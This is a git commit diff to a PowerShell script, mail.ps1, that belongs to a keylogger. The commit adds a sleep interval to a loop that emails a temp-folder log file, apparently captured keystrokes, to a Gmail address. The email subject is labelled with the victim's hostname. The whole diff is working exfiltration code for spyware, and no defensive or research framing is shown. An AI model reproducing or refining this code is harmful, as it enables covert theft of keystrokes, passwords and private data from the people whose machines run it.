7dadb2cdadad9199da0c30edfc22171f46e7fde7
Miguel Angel Rocha Vázquez <miguel_rocha00715@hotmail.com>
2017-08-24 19:01:59 -0500

    Update mail.ps1

--- mail.ps1
+++ mail.ps1
@@ -6,4 +6,4 @@ $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'pruebapoloa@gmail.com'
 $ReportEmail.To.Add('pruebapoloa@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-while(1){$ReportEmail.Attachments.Add("$ENV:temp\testing123.txt");$SMTPInfo.Send($ReportEmail);360}
+while(1){$ReportEmail.Attachments.Add("$ENV:temp\testing123.txt");$SMTPInfo.Send($ReportEmail); sleep 360}
